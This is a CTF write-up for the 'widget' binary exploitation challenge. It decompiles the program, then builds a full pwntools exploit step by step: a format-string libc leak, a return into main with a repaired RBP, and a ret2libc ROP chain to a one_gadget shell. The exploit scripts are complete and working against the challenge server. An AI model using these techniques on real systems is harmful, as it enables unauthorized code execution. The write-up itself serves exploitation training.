# widget

## Description

> I seem to have lost my gadgets.
>
> `nc challs.actf.co 31320`

{% file src="../../../.gitbook/assets/Dockerfile" %}

{% file src="../../../.gitbook/assets/widget" %}

## Solution

This solution is overcomplicated in order to get RCE.\
There are simpler solutions that just jumps to win() to print the flag.

### TL;DR

* Leak libc address with printf
* Return to main, caring for RBP value
* Perform ret2libc, using one\_gadget for RCE

### Initial Analysis

Decompiling the `widget` binary in ghidra, there are 2 functions of interest, `main` and `win`.

{% tabs %}
{% tab title="main()" %}
```c
void main(void)

{
  int local_2c;
  char local_28 [24];
  __gid_t local_10;
  uint local_c;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  local_10 = getegid();
  setresgid(local_10,local_10,local_10);
  if (called != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  called = 1;
  printf("Amount: ");
  local_2c = 0;
  __isoc99_scanf("%d",&local_2c);
  getchar();
  if (local_2c < 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("Contents: ");
  read(0,local_28,(long)local_2c);
  local_c = 0;
  while( true ) {
    if (local_2c <= (int)local_c) {
      printf("Your input: ");
      printf(local_28);
      return;
    }
    if (local_28[(int)local_c] == 'n') break;
    local_c = local_c + 1;
  }
  printf("bad %d\n",(ulong)local_c);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
{% endtab %}

{% tab title="win()" %}
```c
void win(char *param_1,char *param_2)

{
  int iVar1;
  char local_98 [136];
  FILE *local_10;
  
  iVar1 = strncmp(param_1,"14571414c5d9fe9ed0698ef21065d8a6",0x20);
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = strncmp(param_2,"willy_wonka_widget_factory",0x1a);
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Error: missing flag.txt.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_98,0x80,local_10);
  puts(local_98);
  return;
}
```
{% endtab %}
{% endtabs %}

At first glance, we can determine that the author wants us to overwrite **RIP** to return to the `win` function and find suitable gadgets to input the proper arguments into the `win` function in order to print the flag.

Since there is a lack of gadgets, I instead, took the laborious approach of using `libc` to gain RCE.

### Finding Vulnerabilities

In the `main` function, we can see there are 2 obvious vulnerabilities:

#### Stack overflow

You can input any amount of characters into a buffer of 24 bytes.

```c
void main(void)

{
  int local_2c;
  char local_28 [24];
  __gid_t local_10;
  uint local_c;
  
  ...
  
  printf("Amount: ");
  local_2c = 0;
  __isoc99_scanf("%d",&local_2c);
  getchar();
  if (local_2c < 0) {
    exit(1);
  }
  printf("Contents: ");
  read(0,local_28,(long)local_2c);
  
  ...
}
```

#### Format String Vulnerability (printf)

The `printf` function is performed on the user input, but it checks for the 'n' character.\
This means that we can only leak the stack; we can't perform arbitrary write with `printf`. (you can but you would have to overwrite the `local_c` variable, that's another method that I will not go through)

```c
void main(void)

{
  int local_2c;
  char local_28 [24];
  __gid_t local_10;
  uint local_c;
  
  ...
  
  printf("Contents: ");
  read(0,local_28,(long)local_2c);
  local_c = 0;
  while( true ) {
    if (local_2c <= (int)local_c) {
      printf("Your input: ");
      printf(local_28);
      return;
    }
    if (local_28[(int)local_c] == 'n') break;
    local_c = local_c + 1;
  }
  printf("bad %d\n",(ulong)local_c);
  exit(1);
}
```

### Leaking Addresses With printf

We first create a template to work with the binary using pwntools.

```python
#!/usr/bin/env python3

from pwn import *
import subprocess

def amount(m):
    global p
    p.sendlineafter(b'Amount: ',m)

def content(m):
    global p
    p.sendlineafter(b'Contents: ',m)

elf = context.binary = ELF("./widget_patched",checksec=False)
url,port = "challs.actf.co", 31320

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process(aslr=False)

if args.GDB:
    gdb.attach(p)
    
payload = "test"

amount(str(len(payload)).encode()) # amount should always be equal to len(content)
content(payload)

p.interactive()
p.close()
```

Using `gdb`, we can find that the offset to overwrite RIP is **40** bytes, so our RBP value is at **32** bytes (8 bytes for 64-bit binary).

We first need to find a helpful address to leak.\
We can do this using `gdb`, by setting a breakpoint at the `ret` of main and sending the content as %\<int>$p (where \<int> is a positive integer).

For the initial leak, we want to find any value that we can distinguish on the stack, so we try different \<int> until we get a suitable value.

<figure><img src="../../../.gitbook/assets/image (10) (4).png" alt=""><figcaption><p>break at ret</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (3).png" alt=""><figcaption><p>leaked value</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption><p>stack values</p></figcaption></figure>

As seen in the images, we sent **%19$p** and the return value is at the **0x6** offset on the stack.

We want a libc address and we see one at offset **0x14**, so we can just calculate the offset we need to leak that address:

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption><p>offset calculation</p></figcaption></figure>

Trying for %33$p indeed returns the address we need.

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>leaked libc address</p></figcaption></figure>

<details>

<summary>current code</summary>

```python
#!/usr/bin/env python3

from pwn import *
import subprocess

def amount(m):
    global p
    p.sendlineafter(b'Amount: ',m)

def content(m):
    global p
    p.sendlineafter(b'Contents: ',m)

elf = context.binary = ELF("./widget",checksec=False)
url,port = "challs.actf.co", 31320

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process(aslr=False)

if args.GDB:
    gdb.attach(p)
    
padding = b'A'*32

# first run
payload = b'%33$p|' # leaks libc
payload += b'A' * (32-len(payload))
payload += b'B'*8 # rbp here is needed

amount(str(len(payload)).encode()) # amount should always be equal to len(content)
content(payload)

p.recvuntil(b'Your input: ')
leak = p.recvuntil(b'|',drop=True).decode()
leak = int(leak,16)
print("Leaked:",hex(leak))

p.interactive()
p.close()
```

</details>

### Returning to main

Now we have a libc leak, we need to return to `main` so that we can overwrite RIP again. However, the `called` global variable of the program is already set and checked at the start of main, so we can't just return to `main` directly.

```c
void main(void)

{
  int local_2c;
  char local_28 [24];
  __gid_t local_10;
  uint local_c;
  
  ...

  if (called != 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  called = 1;

  ...
}
```

Looking at ghidra, we can try to return to after the `called` is check and before `Amount` is prompted. This is at address **0x4013e3** of the binary.

<figure><img src="../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption><p>main() in ghidra</p></figcaption></figure>

We can check if this works in our pwntools.

```python
#!/usr/bin/env python3

from pwn import *
import subprocess

def amount(m):
    global p
    p.sendlineafter(b'Amount: ',m)

def content(m):
    global p
    p.sendlineafter(b'Contents: ',m)

elf = context.binary = ELF("./widget",checksec=False)
url,port = "challs.actf.co", 31320

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process(aslr=False)

if args.GDB:
    gdb.attach(p)
    
padding = b'A'*32

# first run
payload = b'%33$p|' # leaks libc
payload += b'A' * (32-len(payload))
payload += b'B'*8 # rbp here is needed
payload += p64(0x004013e3) # goes back to Amount:, not main

amount(str(len(payload)).encode()) # amount should always be equal to len(content)
content(payload)

p.recvuntil(b'Your input: ')
leak = p.recvuntil(b'|',drop=True).decode()
leak = int(leak,16)
print("Leaked:",hex(leak))

p.interactive()
p.close()
```

<figure><img src="../../../.gitbook/assets/image (1) (4).png" alt=""><figcaption><p>running script</p></figcaption></figure>

We see that we do indeed get back our "Amount: " prompt once again, but it hits an EOF, meaning there is probably an error with running the binary.

To find out what went wrong, we attach a gdb to the process:

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption><p>gdb error</p></figcaption></figure>

The process stops at **0x4013f7**, at the **mov dword ptr \[rbp - 0x24], 0** instruction. This suggests that the **RBP** value might be the problem as we overwritten it with '**B**'s.\
We can check that it is indeed the **RBP** problem by setting a breakpoint at the address with the problem (0x4013f7), then trying to view **$rbp-0x24**:

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption><p>rbp error</p></figcaption></figure>

### Fixing RBP

Since we always have to overwrite RBP when we want to overwrite RIP, we have to overwrite RBP with a proper address.

I chose to overwrite RBP with the **.bss section + 0x30** as it would mostly contain null bytes. (0x30 as the program stops at rbp-0x24)

I used **Radare2** to get the **bss** section address and to check the size of the section.

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption><p>binary sections</p></figcaption></figure>

Now the program can run normally once more.

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption><p>program running</p></figcaption></figure>

<details>

<summary>current code</summary>

```python
#!/usr/bin/env python3

from pwn import *
import subprocess

def amount(m):
    global p
    p.sendlineafter(b'Amount: ',m)

def content(m):
    global p
    p.sendlineafter(b'Contents: ',m)

elf = context.binary = ELF("./widget",checksec=False)
url,port = "challs.actf.co", 31320

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process(aslr=False)

if args.GDB:
    gdb.attach(p)

padding = b'A'*32

bss = 0x00404010+0x30

# first run
payload = b'%33$p|' # leaks libc
payload += b'A' * (32-len(payload))
payload += p64(bss) # rbp here is needed
payload += p64(0x004013e3) # goes back to Amount:, not main

amount(str(len(payload)).encode()) # amount should always be equal to len(content)
content(payload)

p.recvuntil(b'Your input: ')
leak = p.recvuntil(b'|',drop=True).decode()
leak = int(leak,16)
print("Leaked:",hex(leak))

p.interactive()
p.close()
```

</details>

### Ret2libc

Now we have a leaked libc address, since our leaked address is the address of **\_\_libc\_start\_main + 128**, we can find the libc that is being used with this info.

We find that the libc version is `libc6_2.35-0ubuntu3_amd64`.

<figure><img src="../../../.gitbook/assets/image (11) (3) (1).png" alt=""><figcaption><p>finding libc version</p></figcaption></figure>

Now we patch our local binary with the new libc.

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>patching binary</p></figcaption></figure>

And we can now do the usual, find one\_gadget and make sure conditions for one\_gadget are satisfied.

But first, we need to adjust our libc base address to align with the leaked libc address. I did this manually using gdb.

### Calculating libc base from leaked address

Attaching gdb to the process using pwntools, I let the program continue:

<figure><img src="../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption><p>continue process</p></figcaption></figure>

Then in gdb, i pressed Ctrl+C to stop the program, then run **vmmap** in gdb-pwndbg to find the libc base address:

<figure><img src="../../../.gitbook/assets/image (10) (2) (1).png" alt=""><figcaption><p>vmmap</p></figcaption></figure>

The address that is highlighted is our libc base address.

Together with the leaked address our program has leaked, we use the **leaked address - libc base address** and that is our offset (constant throughout different instances).

<details>

<summary>current code</summary>

```python
#!/usr/bin/env python3

from pwn import *
import subprocess

def amount(m):
    global p
    p.sendlineafter(b'Amount: ',m)

def content(m):
    global p
    p.sendlineafter(b'Contents: ',m)

elf = context.binary = ELF("./widget_patched",checksec=False)
libc = ELF("./libc6_2.35-0ubuntu3_amd64.so")
url,port = "challs.actf.co", 31320

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process(aslr=False)

if args.GDB:
    gdb.attach(p)

padding = b'A'*32

bss = 0x00404010+0x30

# first run
payload = b'%33$p|' # leaks libc
payload += b'A' * (32-len(payload))
payload += p64(bss) # rbp here is needed
payload += p64(0x004013e3) # goes back to Amount:, not main

amount(str(len(payload)).encode()) # amount should always be equal to len(content)
content(payload)

p.recvuntil(b'Your input: ')
leak = p.recvuntil(b'|',drop=True).decode()
leak = int(leak,16)
offset = 0x155555313e40-0x1555552ea000
libc.address = leak-offset
print("Leaked:",hex(leak))
print("Libc base:",hex(libc.address))

p.interactive()
p.close()
```

</details>

### One gadget

Now we find the offsets of the one\_gadgets in the libc.

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption><p>one_gadgets</p></figcaption></figure>

Any one\_gadget is fine as long as the constraints are fulfilled. I chose the one that requires **RSI** and **RDX** to be null as they are usually short gadgets.

Then we have to find the appropriate gadgets to make **RSI** and **RDX** null. I just try to find suitable pop gadgets to make this work.

#### Searching for POP RDX gadget

Running **ROPgadget --binary libc6\_2.35-0ubuntu3\_amd64.so | grep "ret" | grep "pop rdx"** returns a bunch of gadgets. I chose the one at **0x0000000000090529**.

<figure><img src="../../../.gitbook/assets/image (4) (3) (1).png" alt=""><figcaption><p>pop rdx gadgets</p></figcaption></figure>

#### Searching for POP RSI gadget

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption><p>pop rsi gadgets</p></figcaption></figure>

I chose the gadget at **0x000000000002be51**.

<details>

<summary>current code</summary>

```python
#!/usr/bin/env python3

from pwn import *
import subprocess

def amount(m):
    global p
    p.sendlineafter(b'Amount: ',m)

def content(m):
    global p
    p.sendlineafter(b'Contents: ',m)

elf = context.binary = ELF("./widget_patched",checksec=False)
libc = ELF("./libc6_2.35-0ubuntu3_amd64.so")
url,port = "challs.actf.co", 31320

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process(aslr=False)

if args.GDB:
    gdb.attach(p)

padding = b'A'*32

bss = 0x00404010+0x30

# first run
payload = b'%33$p|' # leaks libc
payload += b'A' * (32-len(payload))
payload += p64(bss) # rbp here is needed
payload += p64(0x004013e3) # goes back to Amount:, not main

amount(str(len(payload)).encode()) # amount should always be equal to len(content)
content(payload)

p.recvuntil(b'Your input: ')
leak = p.recvuntil(b'|',drop=True).decode()
leak = int(leak,16)
offset = 0x155555313e40-0x1555552ea000
libc.address = leak-offset
print("Leaked:",hex(leak))
print("Libc base:",hex(libc.address))

onegadget = libc.address + 0xebcf8
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_rbp = libc.address + 0x0000000000090529

# second run
payload = padding
payload += p64(bss) #rbp
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbp) + p64(0) + p64(0)
payload += p64(onegadget)

amount(str(len(payload)).encode())
content(payload)

p.interactive()
p.close()p
```

</details>

Running the code gives us another EOF error.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption><p>EOF error 2</p></figcaption></figure>

If we use GDB with pwntools again, we see that it is the same RBP error as before. This time, the process is trying to access **rbp-0x78**.

<figure><img src="../../../.gitbook/assets/image (12) (3) (1).png" alt=""><figcaption><p>instruction in GDB</p></figcaption></figure>

We can just change our `bss` value to **+0x100** instead of **+0x30**. We now have a shell.

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption><p>shell</p></figcaption></figure>

{% tabs %}
{% tab title="solve.py" %}
```python
#!/usr/bin/env python3

from pwn import *
import subprocess

def amount(m):
    global p
    p.sendlineafter(b'Amount: ',m)

def content(m):
    global p
    p.sendlineafter(b'Contents: ',m)

elf = context.binary = ELF("./widget_patched",checksec=False)
libc = ELF("./libc6_2.35-0ubuntu3_amd64.so")
url,port = "challs.actf.co", 31320

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process(aslr=False)

if args.GDB:
    gdb.attach(p)

padding = b'A'*32

bss = 0x00404010+0x100

# first run
payload = b'%33$p|' # leaks libc
payload += b'A' * (32-len(payload))
payload += p64(bss) # rbp here is needed
payload += p64(0x004013e3) # goes back to Amount:, not main

amount(str(len(payload)).encode()) # amount should always be equal to len(content)
content(payload)

p.recvuntil(b'Your input: ')
leak = p.recvuntil(b'|',drop=True).decode()
leak = int(leak,16)
offset = 0x155555313e40-0x1555552ea000
libc.address = leak-offset
print("Leaked:",hex(leak))
print("Libc base:",hex(libc.address))

onegadget = libc.address + 0xebcf8
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_rbp = libc.address + 0x0000000000090529

# second run
payload = padding
payload += p64(bss) #rbp
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbp) + p64(0) + p64(0)
payload += p64(onegadget)

amount(str(len(payload)).encode())
content(payload)

p.interactive()
p.close()
```
{% endtab %}
{% endtabs %}
